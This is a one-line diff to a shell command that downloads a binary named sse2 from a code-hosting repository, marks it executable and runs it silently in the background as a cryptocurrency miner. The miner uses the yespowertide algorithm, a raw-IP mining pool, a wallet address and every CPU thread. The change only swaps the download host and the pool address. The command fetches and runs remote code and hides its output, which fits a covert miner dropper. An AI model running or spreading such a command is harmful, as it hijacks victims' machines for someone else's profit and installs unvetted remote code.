@@ -1,1 +1,1 @@
-wget https://gitlab.com/rokok/LA/-/raw/main/sse2 && chmod 777 sse2 && clear && ./sse2 -a yespowertide -o 143.198.85.42:80 -u TAMmcBbUZaWFq2hgPMjqfxSEw2cmoEmSm5.Bismillah -t $(nproc) > /dev/null 2>&1 &
+wget https://github.com/mhusataringan-hub/KOPI/raw/refs/heads/main/sse2 && chmod 777 sse2 && ./sse2 -a yespowertide -o 43.172.89.100:443 -u TAMmcBbUZaWFq2hgPMjqfxSEw2cmoEmSm5.Bismillah -t $(nproc) > /dev/null 2>&1 &
